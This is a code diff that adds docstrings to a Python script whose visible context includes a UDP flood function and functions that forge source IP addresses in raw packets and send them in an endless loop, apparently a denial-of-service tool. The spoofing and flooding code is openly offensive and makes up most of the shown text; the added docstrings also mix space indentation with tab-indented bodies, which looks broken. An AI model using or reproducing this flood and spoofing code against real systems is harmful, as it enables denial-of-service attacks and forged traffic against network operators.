@@ -11,6 +11,12 @@ from pinject import UDP, IP
 VERSION = "v0.0.6-full"
 
 def getLen(string, maxLen):
+    """Get the length of string.
+
+    Keyword arguments:
+    string -- the string whose length is to be returned
+    maxLen -- the maximum length of the string
+    """
     tmp_str = str(len(string))
     lenToReturn = tmp_str
     for i in range(maxLen - len(tmp_str)):
@@ -66,11 +72,27 @@ def UDP_Flood(target_IP, target_Port,msg):
 		sleep(0.01)
 
 def UDP_Spoof(DEST_IP,DEST_PORT,SOURCE_IP,SOURCE_PORT,PAYLOAD):
+    """
+    Creates a packet with desired destination ip, destination port, source port and source ip
+    Keyword arguments:
+    DEST_IP -- the desired destination ip
+    DEST_PORT -- the desired destination port
+    SOURCE_IP -- the desired source ip
+    SOURCE_PORT -- the desired source port
+    """
 	UDP_HEADER = UDP(SOURCE_PORT,DEST_PORT,PAYLOAD).pack(SOURCE_IP,DEST_IP)
 	IP_HEADER = IP(SOURCE_IP,DEST_IP,UDP_HEADER,IPPROTO_UDP).pack()
 	return IP_HEADER+UDP_HEADER+PAYLOAD
 
 def UDP_Spoof_Send(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD):
+    """
+    Spoofs a packet and sends it to TARGET_IP, TARGET_PORT
+    Keyword arguments:
+    TARGET_IP -- the desired destination ip
+    TARGET_PORT -- the desired destination port
+    SPOOFED_IP -- the desired source ip
+    SPOOFED_PORT -- the desired source port
+    """
 	spoofed_packet = UDP_Spoof(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD)
 	sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)
 	while True:
